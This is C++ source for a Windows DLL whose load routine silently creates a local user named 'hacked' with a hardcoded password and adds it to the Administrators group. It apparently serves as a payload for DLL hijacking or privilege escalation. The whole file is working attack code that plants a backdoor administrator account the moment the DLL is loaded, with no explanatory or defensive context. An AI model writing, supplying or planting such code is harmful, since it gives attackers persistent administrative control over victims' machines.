#include <windows.h>
#include <lm.h>

#pragma comment(lib, "netapi32.lib")

extern "C" __declspec(dllexport) void entry() {
    USER_INFO_1 ui;
    DWORD dwLevel = 1;
    DWORD dwError = 0;

    LPCWSTR username = L"hacked";
    LPCWSTR password = L"Hack@1234";

    ui.usri1_name = (LPWSTR)username;
    ui.usri1_password = (LPWSTR)password;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT;
    ui.usri1_script_path = NULL;

    NetUserAdd(NULL, dwLevel, (LPBYTE)&ui, &dwError);
    NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&username, 1);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        entry();
    }
    return TRUE;
}
